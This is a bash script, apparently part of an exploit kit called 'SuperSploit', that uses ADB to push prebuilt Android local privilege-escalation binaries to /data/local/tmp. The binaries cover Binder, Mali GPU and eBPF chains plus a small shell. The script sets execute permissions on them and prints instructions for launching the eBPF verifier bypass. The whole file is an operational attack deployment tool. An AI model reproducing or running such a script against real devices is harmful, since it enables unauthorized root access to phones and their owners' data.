#!/bin/bash
# ==============================================================================
# SuperSploit Automated LPE Deployment Script
# Target: Android 11 / Kernel 4.14 (ARMv7)
# Vectors: CVE-2020-0423 (Binder Info Leak) -> CVE-2019-2215 (Bad Binder LPE)
# ==============================================================================
# points to target dic
TARGET_DIR="/data/local/tmp"
# points to cwd/../..payloads
PAYLOADS_DIR="$(dirname "$0")/../../payloads/"

echo "[*] Verifying ADB connection..."
adb devices | grep -w "device" > /dev/null
if [ $? -ne 0 ]; then
    echo "[-] Error: No ADB device found or device unauthorized."
    exit 1
fi

echo "[*] Connected to device. Pushing payloads to $TARGET_DIR..."

# Push Binder Chain
adb push "$PAYLOADS_DIR/android11_kaslr_leak_android_v7" "$TARGET_DIR/"
adb push "$PAYLOADS_DIR/badbinder_full_android_v7" "$TARGET_DIR/"

# Push Mali Fallback Chain
adb push "$PAYLOADS_DIR/cve_2023_4211_mali_leak_android_v7" "$TARGET_DIR/"
adb push "$PAYLOADS_DIR/cve_2023_4211_mali_gpu_android_v7" "$TARGET_DIR/"

# Push eBPF Chain
adb push "$PAYLOADS_DIR/ebpf_lpe_armv7_android_v7" "$TARGET_DIR/"

# Push Packet Socket Test
adb push "$PAYLOADS_DIR/test_packet_android_v7" "$TARGET_DIR/"

# Push minish for robust network operations
adb push "$PAYLOADS_DIR/minish_android_v7" "$TARGET_DIR/minish"

echo "[*] Setting executable permissions..."
adb shell "chmod +x $TARGET_DIR/android11_kaslr_leak_android_v7"
adb shell "chmod +x $TARGET_DIR/badbinder_full_android_v7"
adb shell "chmod +x $TARGET_DIR/cve_2023_4211_mali_leak_android_v7"
adb shell "chmod +x $TARGET_DIR/cve_2023_4211_mali_gpu_android_v7"
adb shell "chmod +x $TARGET_DIR/ebpf_lpe_armv7_android_v7"
adb shell "chmod +x $TARGET_DIR/minish"

echo ""
echo "[+] ========================================================= [+]"
echo "    DEPLOYMENT COMPLETE"
echo "[+] ========================================================= [+]"
echo ""
echo "Follow these steps to execute the eBPF LPE:"
echo ""
echo "  1. Drop into the device shell:"
echo "     $ adb shell"
echo "  2. Navigate to the temporary directory:"
echo "     $ cd /data/local/tmp"
echo "  3. Execute the eBPF verifier bypass:"
echo "     $ ./ebpf_lpe_armv7_android_v7"
echo ""
echo "[*] Good luck."